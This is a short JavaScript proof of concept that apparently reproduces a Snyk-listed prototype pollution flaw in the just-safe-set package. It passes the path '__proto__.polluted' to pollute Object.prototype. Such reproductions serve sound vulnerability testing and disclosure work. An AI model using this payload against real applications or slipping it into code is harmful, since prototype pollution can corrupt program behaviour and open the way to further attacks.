//https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267
 
  const justSafeSet = require("just-safe-set");
  let obj = {};

   

  justSafeSet(obj, "__proto__.polluted", "yes");
// End of file
